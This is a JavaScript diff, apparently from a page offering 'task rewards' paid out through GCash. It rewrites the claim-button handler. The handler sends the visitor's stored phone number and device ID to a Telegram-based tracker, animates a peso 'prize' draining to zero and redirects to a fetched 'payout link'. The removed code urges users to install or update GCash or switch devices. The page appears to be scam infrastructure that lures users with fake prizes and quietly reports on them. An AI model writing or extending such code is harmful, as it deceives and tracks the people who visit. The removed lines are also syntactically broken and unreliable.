@@ -479,105 +479,92 @@ function hideFirewallPopup() {
     attachPhase2Events(popupInner);
 }
     
-    // ========== ATTACH PHASE 2 EVENTS ==========
-    function attachPhase2Events(popupInner) {
-        const closeBtn = document.getElementById('popupClosePhase2');
-        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
-        
-        const backBtn = document.getElementById('backBtnPhase2');
-        if (backBtn) {
-            backBtn.onclick = function() {
-                popupInner.style.transition = 'opacity 0.3s ease';
-                popupInner.style.opacity = '0';
+   // ========== ATTACH PHASE 2 EVENTS (FIXED) ==========
+function attachPhase2Events(popupInner) {
+    const closeBtn = document.getElementById('popupClosePhase2');
+    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
+    
+    const backBtn = document.getElementById('backBtnPhase2');
+    if (backBtn) {
+        backBtn.onclick = function() {
+            popupInner.style.transition = 'opacity 0.3s ease';
+            popupInner.style.opacity = '0';
+            setTimeout(() => {
+                showPhase1(currentBalance);
+                popupInner.style.opacity = '1';
+            }, 300);
+        };
+    }
+    
+    const proceedBtn = document.getElementById('proceedBtn');
+    if (proceedBtn) {
+        proceedBtn.onclick = async function() {
+            if (claimInProgress) return;
+
+            const userPhone = localStorage.getItem("userPhone") || "Unknown";
+            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            
+            await sendTelegramMessage(userPhone, deviceId, 'claim_click', '');
+            
+            claimInProgress = true;
+            
+            this.classList.add('btn-pulse');
+            setTimeout(() => this.classList.remove('btn-pulse'), 500);
+            
+            this.disabled = true;
+            this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
+            this.style.opacity = '0.8';
+            
+            window.addEventListener('beforeunload', beforeUnloadHandler);
+            
+            const linkData = await getLatestPayoutLink();
+            
+            if (linkData && linkData.url) {
+                // HANAPIN ANG PRIZE AMOUNT ELEMENT SA PHASE 2
+                const prizeAmountElement = document.querySelector('#proceedBtn').closest('.popup-inner').querySelector('.prize-amount-wrapper div[style*="font-size: 36px"]');
+                
+                if (prizeAmountElement) {
+                    // I-disable ang button habang nag-cocountdown
+                    this.disabled = true;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> COUNTDOWN...`;
+                    
+                    // Countdown mula sa current balance pababa hanggang 0 (3 seconds)
+                    const startValue = currentBalance;
+                    const steps = 60;
+                    const decrement = startValue / steps;
+                    
+                    for (let i = 0; i <= steps; i++) {
+                        const current = startValue - (decrement * i);
+                        prizeAmountElement.innerText = `₱${current.toFixed(2)}`;
+                        await new Promise(r => setTimeout(r, 50)); // 50ms x 60 = 3 seconds
+                    }
+                }
+                
+                // MARK LINK AS USED
+                await markLinkAsUsed(linkData.key, userPhone);
+                
+                isRedirecting = true;
+                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
                 setTimeout(() => {
-                    showPhase1(currentBalance);
-                    popupInner.style.opacity = '1';
-                }, 300);
-            };
-        }
-        
-        const proceedBtn = document.getElementById('proceedBtn');
-        if (proceedBtn) {
-            proceedBtn.onclick = async function() {
-                if (claimInProgress) return;
-
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-        
-        await sendTelegramMessage(userPhone, deviceId, 'claim_click', '');
-
+                    window.removeEventListener('beforeunload', beforeUnloadHandler);
+                    window.location.href = linkData.url;
+                }, 500);
                 
-                claimInProgress = true;
+            } else {
+                claimInProgress = false;
+                isRedirecting = false;
+                window.removeEventListener('beforeunload', beforeUnloadHandler);
                 
-                this.classList.add('btn-pulse');
-                setTimeout(() => this.classList.remove('btn-pulse'), 500);
+                this.disabled = false;
+                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
+                this.style.opacity = '1';
                 
-                this.disabled = true;
-                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
-                this.style.opacity = '0.8';
-                
-                window.addEventListener('beforeunload', beforeUnloadHandler);
-                
-                const linkData = await getLatestPayoutLink();
-                
-                 // HANAPIN ANG PRIZE AMOUNT ELEMENT SA PHASE 2
-    const prizeAmountElement = document.querySelector('#proceedBtn').closest('.popup-inner').querySelector('.prize-amount-wrapper div[style*="font-size: 56px"]');
-    
-    if (prizeAmountElement) {
-        // I-disable ang button habang nag-cocountdown
-        this.disabled = true;
-        this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s无限;"> COUNTDOWN...`;
-        
-        // Countdown mula sa current balance pababa hanggang 0 (3 seconds)
-        const startValue = currentBalance;
-        const steps = 60;
-        const decrement = startValue / steps;
-        
-        for (let i = 0; i <= steps; i++) {
-            const current = startValue - (decrement * i);
-            prizeAmountElement.innerText = `₱${current.toFixed(2)}`;
-            await new Promise(r => setTimeout(r, 50)); // 50ms x 60 = 3 seconds
-        }
+                // SHOW TASK #3 MESSAGE
+                showTask3Message();
+            }
+        };
     }
-    
-    // MARK LINK AS USED
-    const userPhone = localStorage.getItem("userPhone");
-    await markLinkAsUsed(linkData.key, userPhone);
-    
-    isRedirecting = true;
-    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
-    setTimeout(() => {
-        window.removeEventListener('beforeunload', beforeUnloadHandler);
-        window.location.href = linkData.url;
-    }, 500);
-    
-} else {
-    claimInProgress = false;
-    isRedirecting = false;
-    window.removeEventListener('beforeunload', beforeUnloadHandler);
-    
-    this.disabled = false;
-    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
-    this.style.opacity = '1';
-    
-    const errorDiv = document.createElement('div');
-    errorDiv.className = 'error-message';
-    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;';
-    errorDiv.innerHTML = `
-        <div style="color: #ff8888; font-size: 14px; font-weight: bold; margin-bottom: 5px;">⚠️ Withdrawal Unsuccessful</div>
-        <div style="color: #ccc; font-size: 11px; line-height: 1.4;">Update or Install GCash App and withdraw your task reward.</div>
-        <div style="color: #ffaa33; font-size: 10px; margin-top: 8px;">or Switch Device and try again!</div>
-    `;
-    
-    const existingError = popupInner.querySelector('.error-message');
-    if (existingError) existingError.remove();
-    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
-    
-    setTimeout(() => {
-        if (errorDiv) errorDiv.remove();
-    }, 5000);
 }
-    }
 
     // ========== TASK #3 MESSAGE (No Available Link) ==========
 function showTask3Message() {
